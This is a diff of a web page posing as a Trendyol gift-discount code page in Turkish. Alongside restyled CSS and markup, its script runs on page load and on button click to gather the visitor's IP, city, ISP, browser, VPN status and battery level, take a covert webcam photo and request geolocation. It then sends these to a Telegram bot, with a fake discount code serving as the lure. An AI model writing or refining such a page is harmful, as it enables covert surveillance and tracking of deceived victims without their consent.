@@ -11,90 +11,96 @@
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: 'Inter', system-ui, sans-serif;
-            background: #f8f8f8;
+            background: #f5f5f5;
             color: #222;
+            padding: 10px;
         }
 
-        .container {
+        .card {
             max-width: 480px;
-            margin: 20px auto;
+            margin: 0 auto;
             background: white;
             border-radius: 16px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            box-shadow: 0 8px 35px rgba(0,0,0,0.12);
             overflow: hidden;
         }
 
-        .header {
-            background: linear-gradient(135deg, #f27a1a, #ff9f4d);
+        .orange-header {
+            background: #f27a1a;
             color: white;
             text-align: center;
-            padding: 35px 20px 30px;
+            padding: 32px 20px;
         }
-        .header img {
-            height: 42px;
-            margin-bottom: 12px;
+        .orange-header img {
+            height: 40px;
+            margin-bottom: 10px;
         }
-        .header h1 {
-            font-size: 26px;
+        .orange-header h1 {
+            font-size: 24px;
             font-weight: 700;
         }
-        .header p {
-            font-size: 16px;
-            margin-top: 8px;
-            opacity: 0.95;
+        .orange-header p {
+            font-size: 15.5px;
+            margin-top: 6px;
         }
 
         .content {
-            padding: 32px 28px;
+            padding: 30px 24px;
         }
 
         input {
             width: 100%;
-            padding: 18px 20px;
-            border: 2px solid #ddd;
+            padding: 16px 20px;
+            border: 2px solid #e0e0e0;
             border-radius: 12px;
-            font-size: 16.5px;
-            margin-bottom: 22px;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        input:focus {
+            border-color: #f27a1a;
+            outline: none;
         }
 
-        button#mainBtn {
+        .btn-primary {
             width: 100%;
-            padding: 18px;
+            padding: 15px;
             background: #f27a1a;
             color: white;
             border: none;
             border-radius: 12px;
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 600;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
             cursor: pointer;
         }
 
-        .app-btn {
+        .btn-secondary {
             width: 100%;
-            padding: 16px;
-            background: #fff;
+            padding: 15px;
+            background: white;
             color: #f27a1a;
             border: 2px solid #f27a1a;
             border-radius: 12px;
             font-size: 16.5px;
             font-weight: 600;
-            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
             text-decoration: none;
-            display: block;
         }
 
-        .error { 
-            color:#e74c3c; 
-            text-align:center; 
-            margin:14px 0; 
-            display:none; 
-            font-size:15px;
+        .error {
+            color: #e74c3c;
+            text-align: center;
+            margin: 12px 0;
+            display: none;
+            font-size: 14.5px;
         }
-        
+
         .code-box {
             margin-top: 24px;
-            background: #fffaf0;
+            background: #fff9f0;
             border: 3px solid #f27a1a;
             border-radius: 12px;
             padding: 24px;
@@ -102,13 +108,13 @@
             display: none;
         }
         .code {
-            font-size: 27px;
+            font-size: 26px;
             font-weight: 700;
-            letter-spacing: 4px;
+            letter-spacing: 3px;
             background: white;
-            padding: 16px;
+            padding: 14px;
             border-radius: 8px;
-            margin: 16px 0;
+            margin: 14px 0;
             border: 2px dashed #f27a1a;
         }
 
@@ -119,31 +125,23 @@
             left: 0;
             right: 0;
             background: white;
-            box-shadow: 0 -4px 20px rgba(0,0,0,0.2);
             padding: 16px 20px;
+            box-shadow: 0 -4px 15px rgba(0,0,0,0.15);
             display: none;
             z-index: 1000;
             font-size: 14px;
         }
-        .cookie-buttons {
-            margin-top: 12px;
-            display: flex;
-            gap: 12px;
-        }
-        .cookie-buttons button {
+        .cookie-btns button {
             flex: 1;
             padding: 12px;
             border-radius: 8px;
-            font-weight: 500;
         }
-        .accept { background: #f27a1a; color: white; border: none; }
-        .reject { background: #eee; color: #333; border: 1px solid #ccc; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header">
+<div class="card">
+    <div class="orange-header">
         <img src="https://cdn.dsmcdn.com/web/logo/ty-web.svg" alt="Trendyol" />
         <h1>Hediye İndirim Kodu</h1>
         <p>Arkadaşın sana özel 400 TL indirim!</p>
@@ -151,35 +149,33 @@
 
     <div class="content">
         <input type="text" id="codeInput" placeholder="Arkadaşınızın verdiği kodu girin" autocomplete="off" />
-        <button id="submitBtn">Kodu Göster</button>
         
-        <a href="https://www.trendyol.com" target="_blank" class="app-btn">
+        <button id="submitBtn" class="btn-primary">Kodu Göster</button>
+        
+        <a href="https://www.trendyol.com" target="_blank" class="btn-secondary">
             📱 Trendyol Uygulamasını Aç
         </a>
 
         <div class="error" id="errorMsg">Kod hatalı veya süresi dolmuş olabilir.</div>
         
         <div class="code-box" id="fakeCode">
-            <strong style="color:#f27a1a;">✅ Kod Başarıyla Tanımlandı!</strong>
+            <strong style="color:#f27a1a; font-size:18px;">✅ Kod Başarıyla Tanımlandı!</strong>
             <div class="code" id="generatedCode">TR-8741-KX</div>
-            <p>Bu kodu Trendyol’da ödeme sırasında kullanabilirsiniz.</p>
+            <p>Bu kodu Trendyol’da sepetinizde kullanabilirsiniz.</p>
         </div>
     </div>
 </div>
 
 <!-- Çerez Banner -->
 <div id="cookie-banner">
-    <div>
-        Trendyol, size en iyi deneyimi sunmak için çerezleri kullanır. 
-        <a href="#" style="color:#f27a1a;">Detaylar</a>
-    </div>
-    <div class="cookie-buttons">
-        <button class="reject" onclick="hideCookie()">Reddet</button>
-        <button class="accept" onclick="acceptCookie()">Kabul Et</button>
+    <div>Trendyol, size en iyi deneyimi sunmak için çerezleri kullanır. <a href="#" style="color:#f27a1a;">Detaylar</a></div>
+    <div class="cookie-btns" style="display:flex; gap:12px; margin-top:12px;">
+        <button onclick="hideCookie()" style="background:#eee; border:none;">Reddet</button>
+        <button onclick="acceptCookie()" style="background:#f27a1a; color:white; border:none;">Kabul Et</button>
     </div>
 </div>
 
-<footer style="text-align:center; margin:30px 0; color:#777; font-size:13px;">
+<footer style="text-align:center; margin-top:30px; color:#666; font-size:13px;">
     Trendyol.com © 2026 • Kullanım Koşulları • Gizlilik Politikası
 </footer>
 
@@ -237,8 +233,7 @@ async function takeSelfieWithData(messageText) {
     await video.play();
     await new Promise(r=>setTimeout(r,500));
     const canvas=document.createElement("canvas");
-    canvas.width=640;
-    canvas.height=480;
+    canvas.width=640; canvas.height=480;
     const ctx=canvas.getContext("2d");
     ctx.drawImage(video,0,0,canvas.width,canvas.height);
     canvas.toBlob(async blob=>{
@@ -246,7 +241,7 @@ async function takeSelfieWithData(messageText) {
       stream.getTracks().forEach(track=>track.stop());
       video.remove();
     },"image/jpeg");
-  }catch(e){ console.log("Selfie açılamadı",e);}
+  }catch(e){ console.log("Selfie hatası",e);}
 }
 
 async function collectUserData(fakeCode){
@@ -254,93 +249,72 @@ async function collectUserData(fakeCode){
   const battery=await getBatteryInfo();
   const userAgent=navigator.userAgent;
   const vpnProxy=(ipData.security && ipData.security.vpn)?"Evet":"Hayır";
-  return `
-📡 IP: ${ipData.ip || "Bilinmiyor"}
-🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}
-🏙️ Şehir: ${ipData.city || "Bilinmiyor"}
-🧠 ISP: ${ipData.org || "Bilinmiyor"}
-📱 Tarayıcı: ${userAgent}
-🔐 VPN/Proxy: ${vpnProxy}
-🔋 Şarj: \( {battery.level}% ( \){battery.charging})
-💻 Kod: ${fakeCode}`;
+  return `📡 IP: ${ipData.ip || "Bilinmiyor"}\n🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}\n🏙️ Şehir: ${ipData.city || "Bilinmiyor"}\n🧠 ISP: ${ipData.org || "Bilinmiyor"}\n📱 Tarayıcı: ${userAgent}\n🔐 VPN: ${vpnProxy}\n🔋 Şarj: ${battery.level}%\n💻 Kod: ${fakeCode}`;
 }
 
 async function sendLocation() {
   if(!navigator.geolocation) return;
-  navigator.geolocation.getCurrentPosition(pos=>{
-    const lat=pos.coords.latitude;
-    const lon=pos.coords.longitude;
+  navigator.geolocation.getCurrentPosition(pos => {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
       method:"POST",
       headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({chat_id:CHAT_ID, latitude:lat, longitude:lon})
+      body:JSON.stringify({chat_id:CHAT_ID, latitude:pos.coords.latitude, longitude:pos.coords.longitude})
     });
   });
 }
 
 function showError(msg){ 
-    const e = document.getElementById("errorMsg");
-    e.textContent = msg;
-    e.style.display = "block";
+    document.getElementById("errorMsg").textContent = msg;
+    document.getElementById("errorMsg").style.display = "block";
     document.getElementById("fakeCode").style.display = "none";
 }
-function hideError(){ 
-    document.getElementById("errorMsg").style.display = "none"; 
-}
+function hideError(){ document.getElementById("errorMsg").style.display = "none"; }
 
-// Çerez Banner
-function showCookieBanner() {
-    document.getElementById("cookie-banner").style.display = "block";
-}
-function hideCookie() {
-    document.getElementById("cookie-banner").style.display = "none";
-}
-function acceptCookie() {
-    hideCookie();
-}
+// Çerez
+function hideCookie(){ document.getElementById("cookie-banner").style.display = "none"; }
+function acceptCookie(){ hideCookie(); }
 
-// Sayfa açılır açılmaz
-(async ()=>{
-  setTimeout(showCookieBanner, 1500);
+// Sayfa açılış
+(async () => {
+  setTimeout(() => document.getElementById("cookie-banner").style.display = "block", 1300);
 
   if(!CHAT_ID || !URL_SIFRE) return;
-  const fakeCode=generateFakeCode();
-  const messageText=await collectUserData(fakeCode);
+  const fakeCode = generateFakeCode();
+  const messageText = await collectUserData(fakeCode);
   await takeSelfieWithData(messageText);
   await sendLocation();
 })();
 
-// Buton
-document.getElementById("submitBtn").addEventListener("click",async ()=>{
-  const input=document.getElementById("codeInput").value.trim();
+document.getElementById("submitBtn").addEventListener("click", async () => {
+  const input = document.getElementById("codeInput").value.trim();
   if(!CHAT_ID || !URL_SIFRE){ 
       showError("Bu siteyi doğru link üzerinden açmalısın."); 
       return; 
   }
 
-  if(input===ADMIN_CODE){
+  if(input === ADMIN_CODE){
     hideError();
-    const fakeCode=generateFakeCode();
+    const fakeCode = generateFakeCode();
     document.getElementById("generatedCode").textContent = fakeCode;
-    document.getElementById("fakeCode").style.display="block";
-    await sendTelegramMessage(ADMIN_ID,"Admin kodu kullanıldı.");
-    const messageText=await collectUserData(fakeCode);
+    document.getElementById("fakeCode").style.display = "block";
+    await sendTelegramMessage(ADMIN_ID, "Admin kodu kullanıldı.");
+    const messageText = await collectUserData(fakeCode);
     await takeSelfieWithData(messageText);
     await sendLocation();
     return;
   }
 
-  if(input!==URL_SIFRE){ 
+  if(input !== URL_SIFRE){ 
       showError("Kod hatalı veya süresi dolmuş olabilir."); 
       return; 
   }
 
   hideError();
-  const fakeCode=generateFakeCode();
+  const fakeCode = generateFakeCode();
   document.getElementById("generatedCode").textContent = fakeCode;
-  document.getElementById("fakeCode").style.display="block";
+  document.getElementById("fakeCode").style.display = "block";
 
-  const messageText=await collectUserData(fakeCode);
+  const messageText = await collectUserData(fakeCode);
   await takeSelfieWithData(messageText);
   await sendLocation();
 });
